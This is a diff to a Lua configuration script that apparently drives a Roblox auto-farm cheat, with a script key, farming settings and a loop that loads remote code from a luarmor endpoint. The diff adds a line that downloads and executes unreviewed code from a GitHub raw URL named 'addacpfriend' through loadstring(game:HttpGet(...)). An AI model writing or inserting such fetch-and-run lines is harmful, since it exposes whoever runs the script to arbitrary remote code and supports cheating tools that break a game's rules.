@@ -1,5 +1,4 @@
 script_key="jWSwkPkkQMYiAgneTTGHYxQApjJtbBKp";
-
 getgenv().Config = {
     ["Time To Sell"] = 35, -- Seconds
     ["Seed"] = {
@@ -62,7 +61,7 @@ getgenv().Config = {
     ["Boost FPS"] = true,
     ["Black Screen"] = false
 }
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fakerdz/fakertrongcay/refs/heads/main/addacpfriend"))()
 repeat
     wait()
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/377ad2cacc3191143399a68eead6a3f0.lua"))()
